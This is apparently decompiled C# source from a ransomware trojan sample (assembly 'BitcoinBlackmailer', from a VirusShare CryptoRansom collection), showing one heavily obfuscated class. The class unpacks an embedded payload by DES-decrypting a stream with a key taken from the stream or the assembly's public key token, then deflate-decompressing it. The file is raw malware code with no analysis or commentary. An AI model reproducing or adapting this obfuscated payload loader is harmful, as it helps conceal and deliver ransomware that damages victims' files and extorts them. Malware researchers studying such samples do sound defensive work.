// Decompiled with JetBrains decompiler
// Type: A.c3c2c7ed57c9be715407a91dab22fc681
// Assembly: BitcoinBlackmailer, Version=2.4.5.0, Culture=neutral, PublicKeyToken=null
// MVID: 4C6D3383-405F-454B-A25B-FBC4B1EC529F
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan.Win32.Scar.oenx-0b164fc0270c83f0d5c3ac554421cfbccd0404ae7c79f700aa485fdf86912ef4.exe

using System;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security;
using System.Security.Cryptography;

namespace A
{
  internal class c3c2c7ed57c9be715407a91dab22fc681
  {
    private static readonly object cbf80eddb7488a3372b21e32ae7ae4874;
    private static readonly int c0cc25327f1a2e8c61eb8f3d0c9f393d1;
    private static readonly int c83bf155365043ad8c139b0c3a751ebda;
    private static readonly MemoryStream c8cfccdd0bc70f6c7a51f75e11796426c = (MemoryStream) null;
    private static readonly MemoryStream ce05efae3277fe4308a3b2a8a78fc27fb = (MemoryStream) null;
    private static readonly byte c821ca61cc8f1c76be955497cfa662d48;

    static c3c2c7ed57c9be715407a91dab22fc681()
    {
      c3c2c7ed57c9be715407a91dab22fc681.c0cc25327f1a2e8c61eb8f3d0c9f393d1 = int.MaxValue;
      c3c2c7ed57c9be715407a91dab22fc681.c83bf155365043ad8c139b0c3a751ebda = int.MinValue;
      c3c2c7ed57c9be715407a91dab22fc681.c8cfccdd0bc70f6c7a51f75e11796426c = cee844f5032fed782086ef16613b6402e.c35c1bacace48a06917bcd6ffc78fd0a9(0);
      c3c2c7ed57c9be715407a91dab22fc681.ce05efae3277fe4308a3b2a8a78fc27fb = cee844f5032fed782086ef16613b6402e.c35c1bacace48a06917bcd6ffc78fd0a9(0);
      c3c2c7ed57c9be715407a91dab22fc681.cbf80eddb7488a3372b21e32ae7ae4874 = cf9e50a97e7bcb96eb4e6aa1c10e44ea4.c35c1bacace48a06917bcd6ffc78fd0a9();
    }

    private static string cd329c934319ccec29a90a70e7d8c398c(
      Assembly c29dfdb7ed9082ccb951ecc2ce91f4e76)
    {
      string cfb65a9e65370c31164ac1a12baae8fad1 = cf827d2df9221362da876c69b7541049f.c513e70930454458ec4d4bc388d1df56f((object) c29dfdb7ed9082ccb951ecc2ce91f4e76);
      int cfb65a9e65370c31164ac1a12baae8fad2 = c645763a3cc3dc16ba26ae85cf6c2422d.c513e70930454458ec4d4bc388d1df56f((object) cfb65a9e65370c31164ac1a12baae8fad1, ',');
      if (cfb65a9e65370c31164ac1a12baae8fad2 >= 0)
        cfb65a9e65370c31164ac1a12baae8fad1 = c724798179d19d1b9ab05fc37d588d308.c513e70930454458ec4d4bc388d1df56f((object) cfb65a9e65370c31164ac1a12baae8fad1, 0, cfb65a9e65370c31164ac1a12baae8fad2);
      return cfb65a9e65370c31164ac1a12baae8fad1;
    }

    private static byte[] cea84078446358f55cbdccb43f69d15ec(
      Assembly c29dfdb7ed9082ccb951ecc2ce91f4e76)
    {
      try
      {
        string cfb65a9e65370c31164ac1a12baae8fad1 = cf827d2df9221362da876c69b7541049f.c513e70930454458ec4d4bc388d1df56f((object) c29dfdb7ed9082ccb951ecc2ce91f4e76);
        int num = c81b6e06550f0e8c7fcf52cbc3f9f0d0b.c513e70930454458ec4d4bc388d1df56f((object) cfb65a9e65370c31164ac1a12baae8fad1, "PublicKeyToken=");
        if (num < 0)
        {
label_1:
          switch (6)
          {
            case 0:
              goto label_1;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (c3c2c7ed57c9be715407a91dab22fc681.cea84078446358f55cbdccb43f69d15ec);
              }
              num = c81b6e06550f0e8c7fcf52cbc3f9f0d0b.c513e70930454458ec4d4bc388d1df56f((object) cfb65a9e65370c31164ac1a12baae8fad1, "publickeytoken=");
              break;
          }
        }
        if (num < 0)
        {
label_6:
          switch (3)
          {
            case 0:
              goto label_6;
            default:
              return (byte[]) null;
          }
        }
        else
        {
          int cfb65a9e65370c31164ac1a12baae8fad2 = num + 15;
          if (c5782488a7ad6dbed730df25a4b842625.c513e70930454458ec4d4bc388d1df56f((object) cfb65a9e65370c31164ac1a12baae8fad1, cfb65a9e65370c31164ac1a12baae8fad2) != 'n')
          {
label_9:
            switch (3)
            {
              case 0:
                goto label_9;
              default:
                if (c5782488a7ad6dbed730df25a4b842625.c513e70930454458ec4d4bc388d1df56f((object) cfb65a9e65370c31164ac1a12baae8fad1, cfb65a9e65370c31164ac1a12baae8fad2) == 'N')
                {
label_11:
                  switch (4)
                  {
                    case 0:
                      goto label_11;
                  }
                }
                else
                {
                  byte[] cfb65a9e65370c31164ac1a12baae8fad3 = c318ea144ed7d0b53d9e05c5cd3751c8f.c35c1bacace48a06917bcd6ffc78fd0a9(c2712465423dc9e28ac7fd4faf76562ed.c35c1bacace48a06917bcd6ffc78fd0a9(c724798179d19d1b9ab05fc37d588d308.c513e70930454458ec4d4bc388d1df56f((object) cfb65a9e65370c31164ac1a12baae8fad1, cfb65a9e65370c31164ac1a12baae8fad2, 16), NumberStyles.HexNumber));
                  cd49ea4585cb22e7717eb3f3fc731b02b.c35c1bacace48a06917bcd6ffc78fd0a9((Array) cfb65a9e65370c31164ac1a12baae8fad3);
                  return cfb65a9e65370c31164ac1a12baae8fad3;
                }
                break;
            }
          }
          return (byte[]) null;
        }
      }
      catch
      {
      }
      return (byte[]) null;
    }

    internal static byte[] c58b68055b9ae0367e5ef2568dfe99721(
      Stream c6b5df8fbc6ddda5c3bbdf4f91e04f8a2)
    {
      object cbf80eddb7488a3372b21e32ae7ae4874;
      cfb7bc0da11ae7b48b5819c1a0a3c5f18.c35c1bacace48a06917bcd6ffc78fd0a9(cbf80eddb7488a3372b21e32ae7ae4874 = c3c2c7ed57c9be715407a91dab22fc681.cbf80eddb7488a3372b21e32ae7ae4874);
      try
      {
        return c3c2c7ed57c9be715407a91dab22fc681.c045627e57c00758348c15163f49e1f4b(97L, c6b5df8fbc6ddda5c3bbdf4f91e04f8a2);
      }
      finally
      {
        cfd1e8600b6d2aeb9a0f85382917e4d7e.c35c1bacace48a06917bcd6ffc78fd0a9(cbf80eddb7488a3372b21e32ae7ae4874);
      }
    }

    internal static byte[] c8cd1f2364f9d323fc7cd6a27b2293cc4(
      long c821ca61cc8f1c76be955497cfa662d48,
      Stream c6b5df8fbc6ddda5c3bbdf4f91e04f8a2)
    {
      try
      {
        return c3c2c7ed57c9be715407a91dab22fc681.c58b68055b9ae0367e5ef2568dfe99721(c6b5df8fbc6ddda5c3bbdf4f91e04f8a2);
      }
      catch (HostProtectionException ex)
      {
        return c3c2c7ed57c9be715407a91dab22fc681.c045627e57c00758348c15163f49e1f4b(97L, c6b5df8fbc6ddda5c3bbdf4f91e04f8a2);
      }
    }

    internal static byte[] c045627e57c00758348c15163f49e1f4b(
      long c821ca61cc8f1c76be955497cfa662d48,
      Stream c6b5df8fbc6ddda5c3bbdf4f91e04f8a2)
    {
      Stream cfb65a9e65370c31164ac1a12baae8fad1 = c6b5df8fbc6ddda5c3bbdf4f91e04f8a2;
      MemoryStream cfb65a9e65370c31164ac1a12baae8fad2 = (MemoryStream) null;
      for (int index = 1; index < 4; ++index)
        c1b6c608d3b891f5ef8fb41ec205c5e0f.c513e70930454458ec4d4bc388d1df56f((object) c6b5df8fbc6ddda5c3bbdf4f91e04f8a2);
label_3:
      switch (4)
      {
        case 0:
          goto label_3;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (c3c2c7ed57c9be715407a91dab22fc681.c045627e57c00758348c15163f49e1f4b);
          }
          ushort num1 = ~(ushort) c1b6c608d3b891f5ef8fb41ec205c5e0f.c513e70930454458ec4d4bc388d1df56f((object) c6b5df8fbc6ddda5c3bbdf4f91e04f8a2);
          if (((int) num1 & 2) != 0)
          {
            DESCryptoServiceProvider cfb65a9e65370c31164ac1a12baae8fad3 = cdbb4ed9692ea99a585d4f82b09982067.c35c1bacace48a06917bcd6ffc78fd0a9();
            byte[] cfb65a9e65370c31164ac1a12baae8fad4 = new byte[8];
            c9be430ebb22dc779d1ae87a6e1ea55ff.c513e70930454458ec4d4bc388d1df56f((object) c6b5df8fbc6ddda5c3bbdf4f91e04f8a2, cfb65a9e65370c31164ac1a12baae8fad4, 0, 8);
            c38293723be1712eb0bc8ac6480a2c994.c513e70930454458ec4d4bc388d1df56f((object) cfb65a9e65370c31164ac1a12baae8fad3, cfb65a9e65370c31164ac1a12baae8fad4);
            byte[] cfb65a9e65370c31164ac1a12baae8fad5 = new byte[8];
            c9be430ebb22dc779d1ae87a6e1ea55ff.c513e70930454458ec4d4bc388d1df56f((object) c6b5df8fbc6ddda5c3bbdf4f91e04f8a2, cfb65a9e65370c31164ac1a12baae8fad5, 0, 8);
            bool flag = true;
            foreach (byte num2 in cfb65a9e65370c31164ac1a12baae8fad5)
            {
              if (num2 != (byte) 0)
              {
label_9:
                switch (7)
                {
                  case 0:
                    goto label_9;
                  default:
                    flag = false;
                    goto label_13;
                }
              }
            }
label_13:
            if (flag)
              cfb65a9e65370c31164ac1a12baae8fad5 = c3c2c7ed57c9be715407a91dab22fc681.cea84078446358f55cbdccb43f69d15ec(ccc0c294e6d85e05b7f7a7a1671cb8900.c35c1bacace48a06917bcd6ffc78fd0a9());
            cc295f27300446f57c6aedad0a676c4c1.c513e70930454458ec4d4bc388d1df56f((object) cfb65a9e65370c31164ac1a12baae8fad3, cfb65a9e65370c31164ac1a12baae8fad5);
            if (c3c2c7ed57c9be715407a91dab22fc681.c8cfccdd0bc70f6c7a51f75e11796426c == null)
            {
              if (c3c2c7ed57c9be715407a91dab22fc681.c0cc25327f1a2e8c61eb8f3d0c9f393d1 == int.MaxValue)
                c4edf7e536c5d389b7e6e2b54b3e7c478.c513e70930454458ec4d4bc388d1df56f((object) c3c2c7ed57c9be715407a91dab22fc681.c8cfccdd0bc70f6c7a51f75e11796426c, (int) c63b061b623eb5314865790cef395e8e9.c513e70930454458ec4d4bc388d1df56f((object) c6b5df8fbc6ddda5c3bbdf4f91e04f8a2));
              else
                c4edf7e536c5d389b7e6e2b54b3e7c478.c513e70930454458ec4d4bc388d1df56f((object) c3c2c7ed57c9be715407a91dab22fc681.c8cfccdd0bc70f6c7a51f75e11796426c, c3c2c7ed57c9be715407a91dab22fc681.c0cc25327f1a2e8c61eb8f3d0c9f393d1);
            }
            c1ea03b979c78f0ca0cb6fb68f4c5eee0.c513e70930454458ec4d4bc388d1df56f((object) c3c2c7ed57c9be715407a91dab22fc681.c8cfccdd0bc70f6c7a51f75e11796426c, 0L);
            ICryptoTransform cfb65a9e65370c31164ac1a12baae8fad6 = c9e70a1a07afb4c5285078203bee4f7ff.c513e70930454458ec4d4bc388d1df56f((object) cfb65a9e65370c31164ac1a12baae8fad3);
            int cfb65a9e65370c31164ac1a12baae8fad7 = c345b36dcb742e747a32e45780611069f.c513e70930454458ec4d4bc388d1df56f((object) cfb65a9e65370c31164ac1a12baae8fad6);
            c6318bdef7f669c64ce10ed720b96d4b9.c513e70930454458ec4d4bc388d1df56f((object) cfb65a9e65370c31164ac1a12baae8fad6);
            byte[] cfb65a9e65370c31164ac1a12baae8fad8 = new byte[c6318bdef7f669c64ce10ed720b96d4b9.c513e70930454458ec4d4bc388d1df56f((object) cfb65a9e65370c31164ac1a12baae8fad6)];
            byte[] cfb65a9e65370c31164ac1a12baae8fad9 = new byte[c345b36dcb742e747a32e45780611069f.c513e70930454458ec4d4bc388d1df56f((object) cfb65a9e65370c31164ac1a12baae8fad6)];
            int num3;
            for (num3 = (int) cb89139e6742959d3f3a0ed0b41c82c28.c513e70930454458ec4d4bc388d1df56f((object) c6b5df8fbc6ddda5c3bbdf4f91e04f8a2); (long) (num3 + cfb65a9e65370c31164ac1a12baae8fad7) < c63b061b623eb5314865790cef395e8e9.c513e70930454458ec4d4bc388d1df56f((object) c6b5df8fbc6ddda5c3bbdf4f91e04f8a2); num3 += cfb65a9e65370c31164ac1a12baae8fad7)
            {
              c9be430ebb22dc779d1ae87a6e1ea55ff.c513e70930454458ec4d4bc388d1df56f((object) c6b5df8fbc6ddda5c3bbdf4f91e04f8a2, cfb65a9e65370c31164ac1a12baae8fad9, 0, cfb65a9e65370c31164ac1a12baae8fad7);
              int cfb65a9e65370c31164ac1a12baae8fad10 = c43ee22076a42ec9f1617320f75dba0b6.c513e70930454458ec4d4bc388d1df56f((object) cfb65a9e65370c31164ac1a12baae8fad6, cfb65a9e65370c31164ac1a12baae8fad9, 0, cfb65a9e65370c31164ac1a12baae8fad7, cfb65a9e65370c31164ac1a12baae8fad8, 0);
              c4e76316183bf2f7ba04cf3a2060941d1.c513e70930454458ec4d4bc388d1df56f((object) c3c2c7ed57c9be715407a91dab22fc681.c8cfccdd0bc70f6c7a51f75e11796426c, cfb65a9e65370c31164ac1a12baae8fad8, 0, cfb65a9e65370c31164ac1a12baae8fad10);
            }
label_22:
            switch (7)
            {
              case 0:
                goto label_22;
              default:
                c9be430ebb22dc779d1ae87a6e1ea55ff.c513e70930454458ec4d4bc388d1df56f((object) c6b5df8fbc6ddda5c3bbdf4f91e04f8a2, cfb65a9e65370c31164ac1a12baae8fad9, 0, (int) (c63b061b623eb5314865790cef395e8e9.c513e70930454458ec4d4bc388d1df56f((object) c6b5df8fbc6ddda5c3bbdf4f91e04f8a2) - (long) num3));
                byte[] cfb65a9e65370c31164ac1a12baae8fad11 = cfedd14c5f77929ee51d09d7e79f303ec.c513e70930454458ec4d4bc388d1df56f((object) cfb65a9e65370c31164ac1a12baae8fad6, cfb65a9e65370c31164ac1a12baae8fad9, 0, (int) (c63b061b623eb5314865790cef395e8e9.c513e70930454458ec4d4bc388d1df56f((object) c6b5df8fbc6ddda5c3bbdf4f91e04f8a2) - (long) num3));
                c4e76316183bf2f7ba04cf3a2060941d1.c513e70930454458ec4d4bc388d1df56f((object) c3c2c7ed57c9be715407a91dab22fc681.c8cfccdd0bc70f6c7a51f75e11796426c, cfb65a9e65370c31164ac1a12baae8fad11, 0, cfb65a9e65370c31164ac1a12baae8fad11.Length);
                cfb65a9e65370c31164ac1a12baae8fad1 = (Stream) c3c2c7ed57c9be715407a91dab22fc681.c8cfccdd0bc70f6c7a51f75e11796426c;
                c1ea03b979c78f0ca0cb6fb68f4c5eee0.c513e70930454458ec4d4bc388d1df56f((object) cfb65a9e65370c31164ac1a12baae8fad1, 0L);
                cfb65a9e65370c31164ac1a12baae8fad2 = c3c2c7ed57c9be715407a91dab22fc681.c8cfccdd0bc70f6c7a51f75e11796426c;
                break;
            }
          }
          if (((int) num1 & 8) != 0)
          {
label_25:
            switch (1)
            {
              case 0:
                goto label_25;
              default:
                if (c3c2c7ed57c9be715407a91dab22fc681.ce05efae3277fe4308a3b2a8a78fc27fb == null)
                {
                  if (c3c2c7ed57c9be715407a91dab22fc681.c83bf155365043ad8c139b0c3a751ebda == int.MinValue)
                  {
label_28:
                    switch (5)
                    {
                      case 0:
                        goto label_28;
                      default:
                        c4edf7e536c5d389b7e6e2b54b3e7c478.c513e70930454458ec4d4bc388d1df56f((object) c3c2c7ed57c9be715407a91dab22fc681.ce05efae3277fe4308a3b2a8a78fc27fb, (int) c63b061b623eb5314865790cef395e8e9.c513e70930454458ec4d4bc388d1df56f((object) cfb65a9e65370c31164ac1a12baae8fad1) * 2);
                        break;
                    }
                  }
                  else
                    c4edf7e536c5d389b7e6e2b54b3e7c478.c513e70930454458ec4d4bc388d1df56f((object) c3c2c7ed57c9be715407a91dab22fc681.ce05efae3277fe4308a3b2a8a78fc27fb, c3c2c7ed57c9be715407a91dab22fc681.c83bf155365043ad8c139b0c3a751ebda);
                }
                c1ea03b979c78f0ca0cb6fb68f4c5eee0.c513e70930454458ec4d4bc388d1df56f((object) c3c2c7ed57c9be715407a91dab22fc681.ce05efae3277fe4308a3b2a8a78fc27fb, 0L);
                DeflateStream cfb65a9e65370c31164ac1a12baae8fad12 = c294da35965295a2dfdb37cb1780217c9.c35c1bacace48a06917bcd6ffc78fd0a9(cfb65a9e65370c31164ac1a12baae8fad1, CompressionMode.Decompress);
                int cfb65a9e65370c31164ac1a12baae8fad13 = 1000;
                byte[] cfb65a9e65370c31164ac1a12baae8fad14 = new byte[cfb65a9e65370c31164ac1a12baae8fad13];
                int cfb65a9e65370c31164ac1a12baae8fad15;
                do
                {
                  cfb65a9e65370c31164ac1a12baae8fad15 = c9be430ebb22dc779d1ae87a6e1ea55ff.c513e70930454458ec4d4bc388d1df56f((object) cfb65a9e65370c31164ac1a12baae8fad12, cfb65a9e65370c31164ac1a12baae8fad14, 0, cfb65a9e65370c31164ac1a12baae8fad13);
                  if (cfb65a9e65370c31164ac1a12baae8fad15 > 0)
                  {
label_33:
                    switch (4)
                    {
                      case 0:
                        goto label_33;
                      default:
                        c4e76316183bf2f7ba04cf3a2060941d1.c513e70930454458ec4d4bc388d1df56f((object) c3c2c7ed57c9be715407a91dab22fc681.ce05efae3277fe4308a3b2a8a78fc27fb, cfb65a9e65370c31164ac1a12baae8fad14, 0, cfb65a9e65370c31164ac1a12baae8fad15);
                        break;
                    }
                  }
                }
                while (cfb65a9e65370c31164ac1a12baae8fad15 >= cfb65a9e65370c31164ac1a12baae8fad13);
label_36:
                switch (3)
                {
                  case 0:
                    goto label_36;
                  default:
                    cfb65a9e65370c31164ac1a12baae8fad2 = c3c2c7ed57c9be715407a91dab22fc681.ce05efae3277fe4308a3b2a8a78fc27fb;
                    break;
                }
                break;
            }
          }
          if (cfb65a9e65370c31164ac1a12baae8fad2 != null)
            return ceb707431d85c778d57272c17f79d3053.c513e70930454458ec4d4bc388d1df56f((object) cfb65a9e65370c31164ac1a12baae8fad2);
          byte[] cfb65a9e65370c31164ac1a12baae8fad16 = new byte[c63b061b623eb5314865790cef395e8e9.c513e70930454458ec4d4bc388d1df56f((object) c6b5df8fbc6ddda5c3bbdf4f91e04f8a2) - cb89139e6742959d3f3a0ed0b41c82c28.c513e70930454458ec4d4bc388d1df56f((object) c6b5df8fbc6ddda5c3bbdf4f91e04f8a2)];
          c9be430ebb22dc779d1ae87a6e1ea55ff.c513e70930454458ec4d4bc388d1df56f((object) c6b5df8fbc6ddda5c3bbdf4f91e04f8a2, cfb65a9e65370c31164ac1a12baae8fad16, 0, cfb65a9e65370c31164ac1a12baae8fad16.Length);
          return cfb65a9e65370c31164ac1a12baae8fad16;
      }
    }
  }
}
